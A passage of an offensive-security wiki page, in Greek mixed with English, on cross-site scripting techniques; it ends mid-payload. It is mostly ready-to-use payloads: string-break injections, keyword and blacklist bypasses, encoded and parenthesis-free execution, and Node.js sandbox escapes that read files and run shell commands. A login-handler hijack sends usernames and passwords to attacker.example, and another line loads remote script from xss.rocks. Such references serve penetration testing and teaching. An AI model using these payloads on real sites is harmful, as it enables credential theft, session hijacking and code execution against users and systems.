Σημειώστε ότι σε αυτό το παράδειγμα **δεν έχουμε καν κλείσει το απλό απόστροφο**. Αυτό συμβαίνει επειδή **η ανάλυση του HTML γίνεται πρώτα από το πρόγραμμα περιήγησης**, η οποία περιλαμβάνει την αναγνώριση στοιχείων της σελίδας, συμπεριλαμβανομένων μπλοκ script. Η ανάλυση του JavaScript για να κατανοηθούν και να εκτελεστούν τα ενσωματωμένα scripts πραγματοποιείται μόνο κατόπιν.

### Μέσα στον κώδικα JS

Αν τα `<>` φιλτράρονται, μπορείς παρ' όλα αυτά να **escape the string** στο σημείο όπου βρίσκεται το input σου και να **execute arbitrary JS**. Είναι σημαντικό να **fix JS syntax**, γιατί αν υπάρχουν σφάλματα, ο κώδικας JS δεν θα εκτελεστεί:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Όταν η είσοδος χρήστη καταλήγει μέσα σε ένα quoted JavaScript string (π.χ., server-side echo σε ένα inline script), μπορείτε να τερματίσετε το string, να inject code και να repair τη σύνταξη ώστε το parsing να παραμείνει έγκυρο. Γενικός σκελετός:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Παράδειγμα προτύπου URL όταν η ευάλωτη παράμετρος αντικατοπτρίζεται σε JS string:
```
?param=test";<INJECTION>;a="
```
This executes attacker JS without needing to touch HTML context (pure JS-in-JS). Combine with blacklist bypasses below when filters block keywords.

### Template literals ``

Για να κατασκευάσετε **συμβολοσειρές**, πέρα από τα μονά και διπλά quotes, το JS αποδέχεται επίσης **backticks** **` `` `** .\
Αυτό είναι γνωστό ως template literals καθώς επιτρέπει την **ενσωμάτωση JS εκφράσεων** χρησιμοποιώντας τη σύνταξη `${ ... }`.\  
Επομένως, αν διαπιστώσετε ότι η είσοδός σας γίνεται **reflected** μέσα σε μια JS string που χρησιμοποιεί backticks, μπορείτε να καταχραστείτε τη σύνταξη `${ ... }` για να εκτελέσετε **arbitrary JS code**:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Κωδικοποιημένη εκτέλεση κώδικα
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Παραδοτέα payloads με eval(atob()) και αποχρώσεις του scope

Για να κρατήσετε τα URLs πιο σύντομα και να παρακάμψετε απλούς φίλτρους λέξεων-κλειδιών, μπορείτε να κωδικοποιήσετε την πραγματική σας λογική σε base64 και να την εκτελέσετε με `eval(atob('...'))`. Αν απλό φιλτράρισμα λέξεων-κλειδιών μπλοκάρει αναγνωριστικά όπως `alert`, `eval` ή `atob`, χρησιμοποιήστε Unicode-escaped αναγνωριστικά που μεταγλωττίζονται ακριβώς το ίδιο στον browser αλλά παρακάμπτουν φίλτρα αντιστοίχισης συμβολοσειρών:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Σημαντική λεπτομέρεια σχετικά με το πεδίο ορατότητας: `const`/`let` declared inside `eval()` are block-scoped and do NOT create globals; they won’t be accessible to later scripts. Χρησιμοποιήστε ένα στοιχείο `<script>` που εισάγεται δυναμικά για να ορίσετε global, non-rebindable hooks όταν χρειάζεται (π.χ., για να hijack έναν form handler):
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Αναφορά: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Κωδικοποίηση Unicode για εκτέλεση JS
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript τεχνικές παράκαμψης blacklists

**Strings**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Ειδικές ακολουθίες διαφυγής**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**Αντικαταστάσεις κενών μέσα σε JS code**
```javascript
<TAB>
/**/
```
**JavaScript comments (από** [**JavaScript Comments**](#javascript-comments) **κόλπο)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**Νέες γραμμές JavaScript (από το** [**JavaScript new line**](#javascript-new-lines) **κόλπο)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript κενά**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript μέσα σε ένα σχόλιο**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript χωρίς παρενθέσεις**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Κλήση αυθαίρετης function (alert)**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

Υπάρχει **JS code** που χρησιμοποιεί **μη ασφαλή δεδομένα ελεγχόμενα από attacker** όπως `location.href`. Ο attacker μπορεί να το εκμεταλλευτεί για να εκτελέσει αυθαίρετο JS code.\
**Εξαιτίας της έκτασης της εξήγησης των** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**


{{#ref}}
dom-xss.md
{{#endref}}

Εκεί θα βρείτε μια λεπτομερή **εξήγηση του τι είναι οι DOM vulnerabilities, πώς προκαλούνται, και πώς να τις εκμεταλλευτείτε**.\
Επίσης, μην ξεχάσετε ότι **στο τέλος του αναφερόμενου άρθρου** μπορείτε να βρείτε μια εξήγηση σχετικά με [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering).

### Αναβάθμιση Self-XSS

### Cookie XSS

Αν μπορείτε να προκαλέσετε XSS στέλνοντας το payload μέσα σε ένα cookie, αυτό συνήθως είναι self-XSS. Ωστόσο, αν βρείτε ένα **vulnerable subdomain to XSS**, μπορείτε να εκμεταλλευτείτε αυτό το XSS για να εγχύσετε ένα cookie σε ολόκληρο το domain, καταφέρνοντας να ενεργοποιήσετε το cookie XSS στο main domain ή σε άλλα subdomains (αυτά που είναι vulnerable σε cookie XSS). Για αυτό μπορείτε να χρησιμοποιήσετε το cookie tossing attack:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Μπορείτε να βρείτε μια εξαιρετική κατάχρηση αυτής της τεχνικής σε [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html).

### Sending your session to the admin

Ίσως ένας user να μπορεί να μοιραστεί το profile του με τον admin και αν το self XSS βρίσκεται μέσα στο profile του user και ο admin το ανοίξει, θα ενεργοποιήσει την ευπάθεια.

### Session Mirroring

Αν βρείτε self XSS και η σελίδα έχει **session mirroring for administrators**, για παράδειγμα επιτρέποντας στους clients να ζητήσουν βοήθεια και ώστε ο admin να σας βοηθήσει θα βλέπει αυτό που βλέπετε στην session σας αλλά από τη δική του session.

Μπορείτε να κάνετε τον **administrator να ενεργοποιήσει το self XSS σας** και να κλέψετε τα cookies/session του.

## Other Bypasses

### Normalised Unicode

Μπορείτε να ελέγξετε αν οι **reflected values** κανονικοποιούνται ως **unicode normalized** στον server (ή στο client side) και να καταχραστείτε αυτή τη λειτουργικότητα για να παρακάμψετε protections. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

Εξαιτίας του **RoR mass assignment** εισαγωγικά εισάγονται στο HTML και τότε ο περιορισμός των εισαγωγικών παρακάμπτεται και πρόσθετα πεδία (onfocus) μπορούν να προστεθούν μέσα στο tag.\
Παράδειγμα φόρμας ([from this report](https://hackerone.com/reports/709336)), αν στείλεις το payload:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Το ζεύγος "Key","Value" θα επιστραφεί ως εξής:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Τότε, το onfocus attribute θα εισαχθεί και θα προκύψει XSS.

### Ειδικοί συνδυασμοί
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### XSS with header injection in a 302 response

Αν διαπιστώσετε ότι μπορείτε να **inject headers σε μια 302 Redirect response** μπορείτε να προσπαθήσετε να **αναγκάσετε το browser να εκτελέσει αυθαίρετο JavaScript**. Αυτό δεν είναι **εύκολο** καθώς οι σύγχρονοι browsers δεν ερμηνεύουν το HTTP response body όταν ο HTTP response status code είναι 302, οπότε ένα απλό cross-site scripting payload είναι άχρηστο.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Only Letters, Numbers and Dots

Εάν μπορείτε να καθορίσετε το **callback** που το javascript πρόκειται να **εκτελέσει** περιορισμένο σε αυτούς τους χαρακτήρες. [**Read this section of this post**](#javascript-function) to find how to abuse this behaviour.

### Valid `<script>` Content-Types to XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) If you try to load a script with a **content-type** such as `application/octet-stream`, Chrome will throw following error:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Οι μόνες **Content-Type** που θα επιτρέψουν στο Chrome να εκτελέσει ένα **loaded script** είναι αυτές που βρίσκονται μέσα στην const **`kSupportedJavascriptTypes`** από [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc)
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Τύποι Script για XSS

(Από [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Λοιπόν, ποιοι τύποι θα μπορούσαν να δηλωθούν για τη φόρτωση ενός script;
```html
<script type="???"></script>
```
Η απάντηση είναι:

- **module** (προεπιλογή, δεν χρειάζεται εξήγηση)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles είναι μια λειτουργία που σας επιτρέπει να πακετάρετε ένα σύνολο δεδομένων (HTML, CSS, JS…) μαζί σε ένα αρχείο **`.wbn`**.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** Επιτρέπει τη βελτίωση της σύνταξης import
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Αυτή η συμπεριφορά χρησιμοποιήθηκε στο [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) για να επαναχαρτογραφήσει μια βιβλιοθήκη στο eval, κατάχρηση της οποίας μπορεί να ενεργοποιήσει XSS.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Αυτή η δυνατότητα στοχεύει κυρίως στην επίλυση ορισμένων προβλημάτων που προκαλούνται από το pre-rendering. Λειτουργεί ως εξής:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types για XSS

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Οι ακόλουθοι τύποι περιεχομένου μπορούν να εκτελέσουν XSS σε όλα τα προγράμματα περιήγησης:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? όχι στη λίστα αλλά νομίζω το είδα σε CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Σε άλλα προγράμματα περιήγησης άλλοι **`Content-Types`** μπορούν να χρησιμοποιηθούν για την εκτέλεση αυθαίρετου JS, δείτε: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml Content Type

Εάν η σελίδα επιστρέφει content-type text/xml, είναι δυνατό να δηλωθεί ένα namespace και να εκτελεστεί αυθαίρετο JS:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Ειδικά πρότυπα αντικατάστασης

Όταν κάτι σαν **`"some {{template}} data".replace("{{template}}", <user_input>)`** χρησιμοποιείται. Ο attacker θα μπορούσε να χρησιμοποιήσει [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) για να προσπαθήσει να παρακάμψει κάποιες προστασίες: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

For example in [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA), this was used to **scape a JSON string** inside a script and execute arbitrary code.

### Chrome Cache to XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Αν έχεις μόνο περιορισμένο σύνολο χαρακτήρων για χρήση, έλεγξε αυτές τις άλλες έγκυρες λύσεις για προβλήματα XSJail:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Αν **όλα είναι undefined** πριν την εκτέλεση untrusted code (όπως στο [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)) είναι δυνατό να δημιουργηθούν χρήσιμα αντικείμενα "από το τίποτα" για να καταχραστείτε την εκτέλεση arbitrary untrusted code:

- Χρησιμοποιώντας import()
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- Πρόσβαση στο `require` έμμεσα

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) τα modules τυλίγονται από το Node.js μέσα σε μια συνάρτηση, όπως αυτή:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Επομένως, αν από εκείνο το module μπορούμε να **call another function**, είναι δυνατό να χρησιμοποιήσουμε `arguments.callee.caller.arguments[1]` από εκείνη την function για να αποκτήσουμε πρόσβαση στο **`require`**:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Με παρόμοιο τρόπο με το προηγούμενο παράδειγμα, είναι δυνατό να **use error handlers** για να αποκτήσετε πρόσβαση στο **wrapper** του module και να πάρετε τη **`require`** function:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Διάφορα obfuscations σε μία σελίδα:** [https://aem1k.com/aurebesh.js/](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Πιο εξελιγμένο JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+